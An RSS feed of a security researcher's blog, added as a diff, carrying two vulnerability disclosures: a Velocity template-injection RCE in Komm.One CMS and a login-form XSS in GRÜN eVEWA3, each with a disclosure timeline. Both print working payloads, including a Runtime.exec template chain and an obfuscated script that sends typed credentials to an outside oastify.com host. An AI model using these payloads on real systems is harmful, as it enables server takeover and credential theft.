@@ -1,0 +1,225 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on Marc-Oliver Munz</title>
+        <link>https://blog.munz4u.de/posts/</link>
+        <description>Recent content in Posts on Marc-Oliver Munz</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+        <lastBuildDate>Wed, 15 Nov 2023 14:12:02 +0100</lastBuildDate>
+        <atom:link href="https://blog.munz4u.de/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>CVE-2024-24230 RCE via SSTI in Komm.One CMS 10.4.2.14</title>
+            <link>https://blog.munz4u.de/posts/2023/11/cve-2024-24230-rce-via-ssti-in-komm.one-cms-10.4.2.14/</link>
+            <pubDate>Wed, 15 Nov 2023 14:12:02 +0100</pubDate>
+            
+            <guid>https://blog.munz4u.de/posts/2023/11/cve-2024-24230-rce-via-ssti-in-komm.one-cms-10.4.2.14/</guid>
+            <description>&lt;style&gt;
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-bottom: 20px; /* Optional: Add some spacing between the table and other elements */
+  }
+
+  th, td {
+    padding: 10px;
+    border: 1px solid #ddd;
+    text-align: left;
+  }
+
+  @media screen and (max-width: 600px) {
+    th, td {
+      display: block;
+      width: 100%;
+      box-sizing: border-box;
+    }
+  }
+&lt;/style&gt;
+&lt;h2 id=&#34;tldr&#34;&gt;TL;DR&lt;/h2&gt;
+&lt;p&gt;I uncovered a critical Remote Code Execution vulnerability in Komm.One&amp;rsquo;s Content Management System version &lt;code&gt;10.4.2.14&lt;/code&gt;. Initially, I identified a Server-Side Template Injection (SSTI) flaw in the Velocity template engine, leading to the execution of arbitrary code and affecting several hundred sites. It is noteworthy that all vulnerable instances have now been fixed.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<style>
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-bottom: 20px; /* Optional: Add some spacing between the table and other elements */
+  }
+
+  th, td {
+    padding: 10px;
+    border: 1px solid #ddd;
+    text-align: left;
+  }
+
+  @media screen and (max-width: 600px) {
+    th, td {
+      display: block;
+      width: 100%;
+      box-sizing: border-box;
+    }
+  }
+</style>
+<h2 id="tldr">TL;DR</h2>
+<p>I uncovered a critical Remote Code Execution vulnerability in Komm.One&rsquo;s Content Management System version <code>10.4.2.14</code>. Initially, I identified a Server-Side Template Injection (SSTI) flaw in the Velocity template engine, leading to the execution of arbitrary code and affecting several hundred sites. It is noteworthy that all vulnerable instances have now been fixed.</p>
+<h2 id="initial-finding">Initial Finding</h2>
+<p>While examining a website, I discovered that the SSTI payload below is echoed processed in the response:</p>
+<pre tabindex="0"><code>Request:
+[redacted]/site/node/494221/c1phy%23set%20%28%24a%3D930%2A885%29%20jpqdp%24%7Ba%7Dy3t0r
+
+Payload decoded:
+#set ($a=930*885) jpqdp${a}y3t0r
+
+Response:
+jpqdp823050y3t0r
+</code></pre><p>This discovery emphasizes that the computation takes place on the server side, presenting a <em>potential</em> risk of remote code execution 💥.</p>
+<h2 id="detect">Detect</h2>
+<p>To determine the template engine in use, I referred to this informative blog: <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a>.
+Considering that the successful payload employed <code>#set</code>, I began crafting <code>Velocity</code> payloads.</p>
+<h2 id="rce">RCE</h2>
+<p>The RCE payload example provided on the page didn&rsquo;t work. After numerous attempts and personal experimentation, I arrived at a functional solution with the following working example:</p>
+<p><strong>Payload</strong></p>
+<pre tabindex="0"><code>c1phy#set($x=&#39;&#39;)##
+#set($rt=$x.class.forName(&#39;java.lang.Runtime&#39;))##
+#set($chr=$x.class.forName(&#39;java.lang.Character&#39;))##
+#set($str=$x.class.forName(&#39;java.lang.String&#39;))##
+#set($ex=$rt.getRuntime().exec(&#39;ls&#39;))##
+$ex.waitFor()
+#set($out=$ex.getInputStream())##
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+</code></pre><p><strong>Final exploit</strong></p>
+<pre tabindex="0"><code>[redacted]/site/node/494221/c1phy%23set%28%24x%3D%27%27%29%23%23%0A%23set%28%24rt%3D%24x.class.forName%28%27java.lang.Runtime%27%29%29%23%23%0A%23set%28%24chr%3D%24x.class.forName%28%27java.lang.Character%27%29%29%23%23%0A%23set%28%24str%3D%24x.class.forName%28%27java.lang.String%27%29%29%23%23%0A%0A%23set%28%24ex%3D%24rt.getRuntime%28%29.exec%28%27ls%27%29%29%23%23%0A%24ex.waitFor%28%29%0A%23set%28%24out%3D%24ex.getInputStream%28%29%29%23%23%0A%23foreach%28%24i%20in%20%5B1..%24out.available%28%29%5D%29%24str.valueOf%28%24chr.toChars%28%24out.read%28%29%29%29%23end/xy.html?zm.sid=zmm0ub85fjf2&amp;nodeID=2406872
+</code></pre><p>Which is executing the <code>ls</code> command within the <code>Velocity</code> engine, resulting in the complete command output being displayed in the page response leading to full RCE.</p>
+<div style="text-align:center;">
+  <img src="/images/CVE-2024-24230.png" alt="c1phy" style="max-width:90%; height:auto; display:block; margin-left:auto; margin-right:auto;">
+</div>
+<h2 id="timeline">Timeline</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Date</th>
+          <th>Event</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>2023</strong>.11.14</td>
+          <td>Vulnerability reported to Federal Office for Information Security (BSI) through their Coordinated Vulnerability Disclosure (CVD) process.</td>
+      </tr>
+      <tr>
+          <td><strong>2023</strong>.11.14</td>
+          <td>Acknowledgement received from BSI.</td>
+      </tr>
+      <tr>
+          <td><strong>2023</strong>.11.21</td>
+          <td>Acknowledgement received from Komm.One CSIRT.</td>
+      </tr>
+      <tr>
+          <td><strong>2023</strong>.11.22</td>
+          <td>All CMS Instances fixed after manual checking.</td>
+      </tr>
+  </tbody>
+</table>
+]]></content>
+        </item>
+        
+        <item>
+            <title>CVE-2023-25295 ATO via rXSS in eVEWA3 Community</title>
+            <link>https://blog.munz4u.de/posts/2023/03/cve-2023-25295-ato-via-rxss-in-evewa3-community/</link>
+            <pubDate>Wed, 08 Mar 2023 12:00:00 +0100</pubDate>
+            
+            <guid>https://blog.munz4u.de/posts/2023/03/cve-2023-25295-ato-via-rxss-in-evewa3-community/</guid>
+            <description>&lt;style&gt;
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-bottom: 20px; /* Optional: Add some spacing between the table and other elements */
+  }
+
+  th, td {
+    padding: 10px;
+    border: 1px solid #ddd;
+    text-align: left;
+  }
+
+  @media screen and (max-width: 600px) {
+    th, td {
+      display: block;
+      width: 100%;
+      box-sizing: border-box;
+    }
+  }
+&lt;/style&gt;
+&lt;h2 id=&#34;tldr&#34;&gt;TL;DR&lt;/h2&gt;
+&lt;p&gt;The GRÜN eVEWA Community versions 31 to 53 were susceptible to a reflected Cross-Site Scripting (rXSS) vulnerability in the login form. This vulnerability enables attackers to acquire escalated privileges by submitting a crafted request to the login panel. To address this issue, a security patch labeled &amp;ldquo;H1&amp;rdquo; has been applied across versions 31 to 53.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<style>
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-bottom: 20px; /* Optional: Add some spacing between the table and other elements */
+  }
+
+  th, td {
+    padding: 10px;
+    border: 1px solid #ddd;
+    text-align: left;
+  }
+
+  @media screen and (max-width: 600px) {
+    th, td {
+      display: block;
+      width: 100%;
+      box-sizing: border-box;
+    }
+  }
+</style>
+<h2 id="tldr">TL;DR</h2>
+<p>The GRÜN eVEWA Community versions 31 to 53 were susceptible to a reflected Cross-Site Scripting (rXSS) vulnerability in the login form. This vulnerability enables attackers to acquire escalated privileges by submitting a crafted request to the login panel. To address this issue, a security patch labeled &ldquo;H1&rdquo; has been applied across versions 31 to 53.</p>
+<h2 id="initial-findings">Initial Findings</h2>
+<p>During my investigation of a domain, I stumbled upon a GRÜN eVEWA site. During my examination of the endpoints, I identified vulnerable rXSS file parameters in the following locations:</p>
+<pre tabindex="0"><code>evewa3ajax.php?file=
+evewa3/evewa3ajax.php?file=
+</code></pre><h2 id="login-panel">Login Panel</h2>
+<p>Upon revisiting the login panel, I found a potential case of URL-based injection. This allowed the injection of JavaScript code via the URL, resulting in the reflection of the injected code within the HTML form section:</p>
+<pre tabindex="0"><code>/evewa3ajax.php%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+</code></pre><h2 id="account-takeover-ato">Account Takeover (ATO)</h2>
+<p>Exploiting the vulnerability, I executed an account takeover by utilizing the JavaScript event <code>onsubmit</code>. This allowed me to surreptitiously transfer the entered credentials to a malicious site whenever the login button was clicked. The impact of this maneuver is a severe compromise of user authentication data, potentially leading to unauthorized access and misuse of user accounts.</p>
+<p>To encapsulate my Out-of-Band (OOB) payload, I utilized the <code>atob</code> function, resulting in the following code snippet:</p>
+<pre tabindex="0"><code>new Image().src=&#34;https://jrelf1m8qnwtv2zteql6r62jiao1cv0k.oastify.com/bogus.php?output=U:&#34;+document.forms[0].elements[1].value+&#34;!P:&#34;+document.forms[0].elements[2].value
+</code></pre><p>Additionally, the payload is subjected to Base64 and URL encoding, culminating in the final, obfuscated version:</p>
+<pre tabindex="0"><code>/%22%20onsubmit%3d%22eval(atob(&#39;bmV3IEltYWdlKCkuc3JjPSJodHRwczovL2pyZWxmMW04cW53dHYyenRlcWw2cjYyamlhbzFjdjBrLm9hc3RpZnkuY29tL2JvZ3VzLnBocD9vdXRwdXQ9VToiK2RvY3VtZW50LmZvcm1zWzBdLmVsZW1lbnRzWzFdLnZhbHVlKyIhUDoiK2RvY3VtZW50LmZvcm1zWzBdLmVsZW1lbnRzWzJdLnZhbHVl&#39;));
+</code></pre><h2 id="timeline">Timeline</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Date</th>
+          <th>Event</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>2023</strong>.01.28</td>
+          <td>Vulnerability reported to Federal Office for Information Security (BSI) through their Coordinated Vulnerability Disclosure (CVD) process.</td>
+      </tr>
+      <tr>
+          <td><strong>2023</strong>.01.30</td>
+          <td>Acknowledgement received from BSI.</td>
+      </tr>
+      <tr>
+          <td><strong>2023</strong>.01.31</td>
+          <td>Acknowledgement received from GRÜN.</td>
+      </tr>
+      <tr>
+          <td><strong>2023</strong>.02.02</td>
+          <td>Information disseminated to GRÜN customers, and patch rollout initiated.</td>
+      </tr>
+      <tr>
+          <td><strong>2023</strong>.03.08</td>
+          <td>Patch <em>H1</em> successfully deployed to all customers; no customers were compromised by the reported vulnerability.</td>
+      </tr>
+  </tbody>
+</table>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
